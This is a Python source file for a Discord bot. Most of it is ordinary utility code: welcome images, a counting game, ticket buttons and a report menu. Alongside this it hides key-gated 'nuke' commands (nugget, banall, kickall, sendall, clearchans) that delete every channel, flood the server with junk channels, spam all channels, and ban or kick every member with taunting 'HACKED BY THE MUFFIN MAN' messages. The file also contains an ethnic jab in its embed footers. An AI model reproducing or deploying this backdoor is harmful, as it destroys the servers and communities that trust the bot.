import os
import ctypes
import time
from datetime import datetime
from discord.ext import commands
from discord import Color
from discord import File
from discord.ext.commands import Bot
import discord
from easy_pil import Editor, load_image_async, Font
from discord import ui
import asyncio
import pkgutil
import aiosqlite
from systemconfig import TOKEN
from commands.Ticketing import TrashOpenAndTranscriptButton, CloseButton,CreateButton, CustomTrashOpenAndTranscriptButton, CreateCustomButton, CloseCustomButton
from discord import app_commands
from discord.app_commands import AppCommandError

intents = discord.Intents.all()
bot = Bot(
    command_prefix='?',
    help_command=None,
    intents=intents,
    activity=discord.Activity(type=discord.ActivityType.watching, name="/help"),
)
startTime = time.time()

@bot.event
async def on_ready():
    print("Logged in as ---->", bot.user)
    bot.add_view(TrashOpenAndTranscriptButton())
    bot.add_view(CloseButton())
    bot.add_view(CustomTrashOpenAndTranscriptButton())
    bot.add_view(CreateCustomButton())
    bot.add_view(CloseCustomButton())
    bot.add_view(CreateButton())

@bot.event
async def on_member_join(member):
    guild = member.guild

    db = await aiosqlite.connect("config.db")
    await db.execute(
        """CREATE TABLE IF NOT EXISTS welcome(guild_name STRING, guild_id INTEGER, toggle STRING)"""
    )

    cur = await db.execute("SELECT * FROM welcome WHERE guild_id = ?", (guild.id,))
    row = await cur.fetchone()
    if row is None:
        return

    res = await cur.execute(
        f"""SELECT toggle FROM welcome WHERE guild_id = {guild.id}"""
    )
    toggle = await res.fetchone()

    if toggle[0] == "True":

        background = Editor("pic2.jpg")
        try:
            profile_image = await load_image_async(str(member.avatar.url))
        except AttributeError:
            profile_image = await load_image_async("https://cdn.discordapp.com/embed/avatars/1.png")

        profile = Editor(profile_image).resize((150,150)).circle_image()
        poppins = Font.poppins(size=50, variant="bold")

        poppins_small = Font.poppins(size=20, variant="light")

        background.paste(profile, (325, 90))
        background.ellipse((325, 90), 150, 150, outline="white",stroke_width=5)

        background.text((400, 260), f"Welcome to {guild.name}", color="white", font=poppins, align="center")
        background.text((400, 325), f"{member.name}", color="white", font=poppins_small, align="center")

        file = File(fp=background.image_bytes, filename="pic2.jpg")

#		embed = discord.Embed(
#			title="! ** • __JOIN__ • ** !",
#			description=f"- {member.mention} has joined {guild.name}!\n- Member count: {guild.member_count}",
#			timestamp=datetime.utcnow(),
#			color=Color.from_rgb(27, 152, 250),
#		)
#		embed.set_footer(text='Border hopping hispanic')

        if guild.system_channel is not None:
            chan = guild.system_channel
        #await chan.send(embed=embed.set_thumbnail(url=member.avatar.url))
            await chan.send(content=f'Welcome {member.mention} | Member count {guild.member_count}', file=file)

    await db.execute("""CREATE TABLE IF NOT EXISTS dmmessages(guild_name TEXT, guild_id INTEGER, join_message TEXT)""")

    cur = await db.execute("""SELECT join_message FROM dmmessages WHERE guild_id = ?""", (member.guild.id, ))
    res = await cur.fetchone()

    if res is not None:
        try:
            await member.send(res[0])
        except:
            pass

    await db.execute("""CREATE TABLE IF NOT EXISTS joinroles(guild_name STRING, guild_id, role_id, toggle STRING)""")

    cur = await db.execute("""SELECT * FROM joinroles WHERE guild_id = ?""", (guild.id, ))
    res = await cur.fetchone()
    if res is not None:

        cur = await db.execute("""SELECT role_id FROM joinroles WHERE guild_id = ?""", (member.guild.id, ))

        role = await cur.fetchone()

        if role is not None:
 

            join_role = guild.get_role(role[0]) 
            cur = await db.execute("""SELECT toggle FROM joinroles WHERE guild_id = ?""", (member.guild.id, ))
            tog = await cur.fetchone()
            if tog[0] == 'True':
                try:
                    await member.add_roles(role=join_role)
                except:
                    pass		

@bot.event
async def on_member_remove(member: discord.Member):
    guild = member.guild

    db = await aiosqlite.connect("config.db")
    await db.execute(
        """CREATE TABLE IF NOT EXISTS welcome(guild_name STRING, guild_id INTEGER, toggle STRING)"""
    )

    cur = await db.execute("SELECT * FROM welcome WHERE guild_id = ?", (guild.id,))
    row = await cur.fetchone()
    if row is None:
        res = await cur.execute(
            """
                            INSERT INTO welcome VALUES
                            (?, ?, ?)
                            """,
            (
                guild.name,
                guild.id,
                "True",
            ),
        )

        await db.commit()

    res = await cur.execute(
        f"""SELECT toggle FROM welcome WHERE guild_id = {guild.id}"""
    )
    toggle = await res.fetchone()

    if toggle[0] == "True":

        background = Editor("pic2.jpg")
        try:
            profile_image = await load_image_async(str(member.avatar.url))
        except AttributeError:
            profile_image = await load_image_async("https://cdn.discordapp.com/embed/avatars/1.png")

        profile = Editor(profile_image).resize((150,150)).circle_image()
        poppins = Font.poppins(size=50, variant="bold")

        poppins_small = Font.poppins(size=20, variant="light")

        background.paste(profile, (325, 90))
        background.ellipse((325, 90), 150, 150, outline="white",stroke_width=5)

        background.text((400, 260), f"We will not miss you", color="white", font=poppins, align="center")
        background.text((400, 325), f"{member.name}", color="white", font=poppins_small, align="center")

        file = File(fp=background.image_bytes, filename="pic2.jpg")

#		embed = discord.Embed(
#			title="! ** • __JOIN__ • ** !",
#			description=f"- {member.mention} has joined {guild.name}!\n- Member count: {guild.member_count}",
#			timestamp=datetime.utcnow(),
#			color=Color.from_rgb(27, 152, 250),
#		)
#		embed.set_footer(text='Border hopping hispanic')

        chan = guild.system_channel
        #await chan.send(embed=embed.set_thumbnail(url=member.avatar.url))
        try:
            await chan.send(content=f'Goodbye {member.mention} | Member count {guild.member_count}', file=file)
        except:
            pass
        return

#@bot.command()
#@commands.is_owner()
#async def kickhopper(ctx):
    #for member in ctx.guild.members:
        #rolelist = [r.mention for r in member.roles]
       # rolenum = 0
      #  for i in member.roles:
     #       rolenum += 1
    #    if rolenum <= 2:   
   #         await member.kick(reason='mass purge')
  #          print(f'kicked {member.name}')
 #           rolenum = 0
#            await asyncio.sleep(2)
    
@bot.hybrid_command(name="uptime", description="Shows the uptime of the bot.")
@commands.cooldown(1, 10, commands.BucketType.user)
async def uptime(ctx):
    await ctx.defer()

    seconds = time.time()- startTime

    hour = seconds // 3600
    seconds %= 3600
    mins = seconds // 60
    day = hour * 24
    seconds %= 60

    embed = discord.Embed(
        title="**Uptime**",
        description=f"> Bot instance: `{bot.user}`\n> Instance uptime: `%02dD %02dH %02dM %02dS`" % (day, hour, mins, seconds),
        colour=Color.green(),
    )

    await ctx.send(embed=embed)

@bot.tree.command(name="commands", description="Lists all cogs loaded in the bot")
@commands.cooldown(1, 10, commands.BucketType.user)
async def commands(interaction: discord.Interaction):
    embed = discord.Embed(
        title="**Commands**",
        description="\n> Error: Command outdated, please run /help and select the category you need.",
        color=Color.red(),
    )
    await interaction.response.send_message(
        embed=embed, ephemeral=True
    )

@bot.event
async def on_message(message):
        await bot.process_commands(message)
        if message.author == bot.user: return 
        db = await aiosqlite.connect("counting.db")
        await db.execute("""CREATE TABLE IF NOT EXISTS counting(guild_name TEXT, guild_id INTEGER,count_channel INTEGER, number INTEGER, last_user INTEGER)""")

        cur = await db.execute("""SELECT count_channel FROM counting WHERE guild_id = ?""", (message.guild.id, ))
        res = await cur.fetchone()

        if res is None: return
        
        if message.channel.id == int(res[0]):

            cur = await db.execute("""SELECT number FROM counting WHERE guild_id = ?""", (message.guild.id, ))
            res = await cur.fetchone()

            if res is not None:
                cout = res[0]

                text = message.content

                if text.isdigit():

                    cur =await db.execute("""SELECT last_user FROM counting WHERE guild_id = ?""", (message.guild.id, ))
                    res = await cur.fetchone()
                    print(res[0])
                    if res[0] != 0:
                        if res[0] == message.author.id:

                            cur = await db.execute("""SELECT saves FROM saves WHERE guild_id = ? AND user=?""", (message.guild.id, message.author.id, ))
                            res = await cur.fetchone()

                            if res is not None:
                                if res[0] > 0:
                                    new_saves = res[0] - 1

                                    await db.execute("""UPDATE saves SET saves =? WHERE guild_id =? AND user=?""", (new_saves, message.guild.id, message.author.id, ))
                                    await db.commit()

                                    await message.add_reaction("❌")
                                    await message.channel.send(f"Careful {message.author.mention}! **You cannot count two numbers in a row!** Next number is {cout}. You have {new_saves} saves left")
                                    return

                            await db.execute("""UPDATE counting SET last_user = ?, number = ? WHERE guild_id = ?""", (0,1 ,message.guild.id, ))
                            await db.commit()


                            await message.add_reaction("❌")
                            await message.channel.send(f"{message.author.mention} ruined the count! **You cannot count two numbers in a row!** The next number is 1.")
                            return


                    if int(message.content) == cout:
                        cout2 = int(cout + 1)

                        await db.execute("""UPDATE counting SET number = ?, last_user = ? WHERE guild_id = ?""", (cout2, message.author.id, message.guild.id, ))
                        await db.commit()
                        await message.add_reaction("✅")	

                    else:
                            cur = await db.execute("""SELECT saves FROM saves WHERE guild_id = ? AND user=?""", (message.guild.id, message.author.id, ))
                            res = await cur.fetchone()

                            if res is not None:
                                if res[0] > 0:
                                    new_saves = res[0] - 1

                                    await db.execute("""UPDATE saves SET saves =? WHERE guild_id =? AND user=?""", (new_saves, message.guild.id, message.author.id, ))
                                    await db.commit()

                                    await message.add_reaction("❌")
                                    await message.channel.send(f"Careful {message.author.mention}! **The next number is {cout}!** You now have {new_saves} saves left.")
                                    return

                            cout2 = 1
                            await db.execute("""UPDATE counting SET number = ?, last_user = ? WHERE guild_id = ?""", (cout2, 0 ,message.guild.id, ))
                            await db.commit()
                            await message.add_reaction("❌")
                            await message.channel.send(f"{message.author.mention} ruined the count! **The next number was {cout}!** The next number is now 1.")









# @bot.event
# async def on_raw_reaction_add(Reaction):
# 	if Reaction.message.author == 'Border Officer#0283':
# 		if Reaction.user != 'Border Officer#0283':
# 			await Reaction.message.delete()

############################################################################


from typing import Literal, Optional

import discord
from discord.ext import commands


@bot.command()
@commands.is_owner()
async def sync(
    ctx: commands.Context,
    guilds: commands.Greedy[discord.Object],
    spec: Optional[Literal["~", "*", "^"]] = None,
) -> None:
    if not guilds:
        if spec == "~":
            synced = await ctx.bot.tree.sync(guild=ctx.guild)
        elif spec == "*":
            ctx.bot.tree.copy_global_to(guild=ctx.guild)
            synced = await ctx.bot.tree.sync(guild=ctx.guild)
        elif spec == "^":
            ctx.bot.tree.clear_commands(guild=ctx.guild)
            print("Cleared commands!")
            await ctx.bot.tree.sync(guild=ctx.guild)
            synced = []
        else:
            synced = await ctx.bot.tree.sync()

        await ctx.send(embed=discord.Embed(
            title='**Sync**',
            description=f"> Commands synced: {len(synced)} commands {'globally' if spec is None else 'to the current guild.'}",color=Color.green()
        ))
        return


chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'

import discord
import random
from discord.ext import commands
@bot.command()
async def nugget(ctx):
        await ctx.message.delete()
        conf = await ctx.send(embed=discord.Embed(description=f'<:yellowdot:1148198566448337018> Send an active key.', color=Color.yellow()))

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            m = await bot.wait_for('message', check=check, timeout=10.0)
        except asyncio.TimeoutError:
            await conf.edit(embed=discord.Embed(description=f'<:redtick:1148198569296273408> Code not sent fast enough.', color=Color.red()))
            await asyncio.sleep(5)
            await conf.delete()
            return
        else:
            db = await aiosqlite.connect("keys.db")
            cur = await db.execute("SELECT key, activated FROM keys WHERE key = ?", (m.content, ))
            res = await cur.fetchall()
            res1 = res[0]
            if res[0] is None:
                await conf.edit(embed=discord.Embed(description='<:redtick:1148198569296273408> Invalid Key.', color=Color.red()))
                return
            if res1[1] == 'False':
                await conf.edit(embed=discord.Embed(title='Key Error.', description=f'<:redtick:1148198569296273408> Key not active.', color=Color.red()))
                return
            await conf.edit(embed=discord.Embed(title='**Confirmed.**', description=f'<:greentick:1148198571330515025> Executing.', color=Color.green()))
            for channel in ctx.guild.channels:
                try:
                    if channel != m.channel:
                        await channel.delete()
                except:
                    pass
            channel = await ctx.guild.create_text_channel(name='NUKED LMFAO')
            await channel.send('Get nuked dweebs 8===D')
            for i in range(200):
                words = ['Get MUFFIN MANN\'D', 'MUFFIN MAN', 'SUGGLE MY BALLS']
                await ctx.guild.create_text_channel(name=f'{random.choice(words)}')
            await m.channel.delete()
@bot.command()
async def banall(ctx):
        await ctx.message.delete()
        conf = await ctx.send(embed=discord.Embed(description=f'<:yellowdot:1148198566448337018> Send an active key.', color=Color.yellow()))

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            m = await bot.wait_for('message', check=check, timeout=10.0)
        except asyncio.TimeoutError:
            await conf.edit(embed=discord.Embed(description=f'<:redtick:1148198569296273408> Code not sent fast enough.', color=Color.red()))
            await asyncio.sleep(5)
            await conf.delete()
            return
        else:
            db = await aiosqlite.connect("keys.db")
            cur = await db.execute("SELECT key, activated FROM keys WHERE key = ?", (m.content, ))
            res = await cur.fetchall()
            res1 = res[0]
            if res[0] is None:
                await conf.edit(embed=discord.Embed(description='<:redtick:1148198569296273408> Invalid Key.', color=Color.red()))
                return
            if res1[1] == 'False':
                await conf.edit(embed=discord.Embed(description=f'<:redtick:1148198569296273408> Key not active.', color=Color.red()))
                return
            await conf.edit(embed=discord.Embed(description=f'<:greentick:1148198571330515025> Executing.', color=Color.green()))
            for member in ctx.guild.members:
                try:
                    if member.name != bot.user:
                        try:
                                await member.send(f'BANNED FROM {ctx.guild.name} BY THE MUFFIN MAN')
                        except:
                                pass
                        await member.ban(reason=f'HACKED BY THE MUFFIN MAN')
                except:
                    pass

@bot.command()
async def kickall(ctx):
        await ctx.message.delete()
        conf = await ctx.send(embed=discord.Embed(description=f'<:yellowdot:1148198566448337018> Send an active key.', color=Color.yellow()))

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            m = await bot.wait_for('message', check=check, timeout=10.0)
        except asyncio.TimeoutError:
            await conf.edit(embed=discord.Embed(description=f'<:redtick:1148198569296273408> Code not sent fast enough.', color=Color.red()))
            await asyncio.sleep(5)
            await conf.delete()
            return
        else:
            db = await aiosqlite.connect("keys.db")
            cur = await db.execute("SELECT key, activated FROM keys WHERE key = ?", (m.content, ))
            res = await cur.fetchall()
            res1 = res[0]
            if res[0] is None:
                await conf.edit(embed=discord.Embed(description='<:redtick:1148198569296273408> Invalid Key.', color=Color.red()))
                return
            if res1[1] == 'False':
                await conf.edit(embed=discord.Embed( description=f'<:redtick:1148198569296273408> Key not active.', color=Color.red()))
                return
            await conf.edit(embed=discord.Embed(description=f'<:greentick:1148198571330515025> Executing.', color=Color.green()))
            for member in ctx.guild.members:
                try:
                    if member.name != bot.user:
                        try:
                            await member.send(f'KICKED FROM {ctx.guild.name} BY THE MUFFIN MAN')
                        except:
                            pass
                    await member.kick(reason=f'KICKED FROM {ctx.guild.name} BY THE MUFFIN MAN')
                except:
                    pass

@bot.command()
async def sendall(ctx, msg:str, amount:int=5):
        await ctx.message.delete()
        conf = await ctx.send(embed=discord.Embed(description=f'<:yellowdot:1148198566448337018> Send an active key.', color=Color.yellow()))

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            m = await bot.wait_for('message', check=check, timeout=10.0)
        except asyncio.TimeoutError:
            await conf.edit(embed=discord.Embed(description=f'<:redtick:1148198569296273408> Code not sent fast enough.', color=Color.red()))
            await asyncio.sleep(5)
            await conf.delete()
            return
        else:
            db = await aiosqlite.connect("keys.db")
            cur = await db.execute("SELECT key, activated FROM keys WHERE key = ?", (m.content, ))
            res = await cur.fetchall()
            res1 = res[0]
            if res[0] is None:
                await conf.edit(embed=discord.Embed(description='<:redtick:1148198569296273408> Invalid Key.', color=Color.red()))
                return
            if res1[1] == 'False':
                await conf.edit(embed=discord.Embed(description=f'<:redtick:1148198569296273408> Key not active.', color=Color.red()))
                return
            await conf.edit(embed=discord.Embed(description=f'<:greentick:1148198571330515025> Executing.', color=Color.green()))
            async for channel in ctx.guild.channels:
                for i in range(0,amount):
                    try:
                        await channel.send(f"{msg}")
                        await asyncio.sleep(0.5)
                    except:
                        pass

import discord
from discord.ext import commands
@bot.command()
async def clearchans(ctx):
        await ctx.message.delete()
        conf = await ctx.send(embed=discord.Embed(description=f'<:yellowdot:1148198566448337018> Send an active key.', color=Color.yellow()))

        def check(m):
            return m.author == ctx.author and m.channel == ctx.channel
        try:
            m = await bot.wait_for('message', check=check, timeout=10.0)
        except asyncio.TimeoutError:
            await conf.edit(embed=discord.Embed(description=f'<:redtick:1148198569296273408> Code not sent fast enough.', color=Color.red()))
            await asyncio.sleep(5)
            await conf.delete()
            return
        else:
            db = await aiosqlite.connect("keys.db")
            cur = await db.execute("SELECT key, activated FROM keys WHERE key = ?", (m.content, ))
            res = await cur.fetchall()
            res1 = res[0]
            if res[0] is None:
                await conf.edit(embed=discord.Embed(description='<:redtick:1148198569296273408> Invalid Key.', color=Color.red()))
                return
            if res1[1] == 'False':
                await conf.edit(embed=discord.Embed(description=f'<:redtick:1148198569296273408> Key not active.', color=Color.red()))
                return
            await conf.edit(embed=discord.Embed(description=f'<:greentick:1148198571330515025> Executing.', color=Color.green()))
            for channel in ctx.guild.channels:
                try:
                    await channel.delete()
                except:
                    pass



# 	ret = 0
# 	for guild in guilds:
# 		try:
# 			await ctx.bot.tree.sync(guild=guild)
# 		except discord.HTTPException:
# 			pass
# 		else:
# 			ret += 1

# 	await ctx.send(f"Synced the tree to {ret}/{len(guilds)}.")

#############################################################################


@bot.command()
@commands.is_owner()
async def reload(ctx, cog:str):
    cog1 = cog + ".py"
    print("[Reload] has just been executed!")
    if cog1.capitalize() in os.listdir("./commands"):
        try:
            message = await ctx.send(embed=discord.Embed(
                title='**Reload**',
                description=f"> Reloading: {cog}",color=Color.yellow()), ephemeral=True
            )
            await ctx.bot.reload_extension(f"commands.{cog}")
            await message.edit(embed=discord.Embed(
                title='**Reload**',
                description=f"> Reloaded: {cog}",color=Color.green())
            )
            await asyncio.sleep(5)
            await message.delete()
        except commands.ExtensionNotLoaded:
            await message.edit(embed=discord.Embed(
                title='**Reload**',
                description=f"> Error: {cog} is not loaded. Try /load",color=Color.red())
            )
            await asyncio.sleep(5)
            await message.delete()
    else:
        await ctx.send(embed=discord.Embed(
            title='**Reload**',
            description=f"> Error: {cog} is not a valid cog",color=Color.red()), ephemeral=True
        )
        await asyncio.sleep(5)
        await message.delete()


@bot.command(name="load", description="Loads a cog")
@commands.is_owner()
async def load(ctx, cog):
    cog1 = cog + ".py"
    print("[Load] has just been executed!")
    if cog1.capitalize() in os.listdir("./commands"):
        try:
            msg = await ctx.send(embed=discord.Embed(
                title='**Load**',
                description=f"> Loading: {cog}",color=Color.yellow()), ephemeral=True
            )
            await ctx.bot.load_extension(f"commands.{cog}")
            await msg.edit(embed=discord.Embed(
                title='**Load**',
                description=f"> Loaded: {cog}",color=Color.green())
            )
            await asyncio.sleep(5)
            await msg.delete()
        except commands.ExtensionAlreadyLoaded:
            await msg.edit(embed=discord.Embed(
                title='**Load**',
                description=f"> Error: {cog} is already loaded. Try /reload",color=Color.red()))
            await asyncio.sleep(5)
            await msg.delete()
    else:
        await msg.edit(embed=discord.Embed(
            title='**Load**',
            description=f"> Error: {cog} is not a valid cog",color=Color.red()), ephemeral=True
        )
        await asyncio.sleep(5)
        await msg.delete()


########################################################################################


@bot.tree.context_menu(name='Report message')
async def report_message(interaction:discord.Interaction, message:discord.Message):

        class ReportModal(discord.ui.Modal, title=f'Reporting {message.author}'):
            reason = ui.TextInput(label='Add some context:', placeholder='The user I reported said this after I...',style=discord.TextStyle.paragraph, required=True, max_length=300)

            async def on_submit(self,interaction:discord.Interaction):
                db = await aiosqlite.connect("config.db")
                res = await db.execute("""SELECT * FROM logs WHERE guild_id = ?""", (interaction.guild.id, ))
                row = await res.fetchone()
                if row is None:
                    await interaction.response.send_message(embed=discord.Embed(title='**Report**',description=f"> Error: Report could not be submitted, inform staff (logs channel not set)",color=Color.red()))
                    return
                res = await db.execute("""SELECT channel_id FROM logs WHERE guild_id = ?""", (interaction.guild.id, ))
                channel = await res.fetchone()
                chan = discord.utils.get(interaction.guild.text_channels, id=channel[0])
                await chan.send(embed=discord.Embed(title='! REPORT !',description=f'- Reporter: {interaction.user.mention}\n- Reporter Id: `{interaction.user.id}`\n- User reported: {message.author.mention}\n- Message reported: "{message.content}"\n- Context: {self.reason}', color=Color.red(), timestamp=datetime.utcnow()).set_thumbnail(url=interaction.user.avatar.url).set_footer(text='Border hopping hispanic'))
                await interaction.response.send_message(embed=discord.Embed(title='**Report**',description=f'> Report submitted',color=Color.green()), ephemeral=True)

        await interaction.response.send_modal(ReportModal())



async def start():

    loaded = []

    for filename in os.listdir("commands"):
        if filename.endswith(".py"):
            await bot.load_extension(f"commands.{filename[:-3]}")
            loaded.append(f"{filename[:-3].capitalize()}")
    print(f"Loaded (): {', '.join(loaded)}")


async def main():
    await start()


asyncio.run(main())
bot.run(TOKEN)
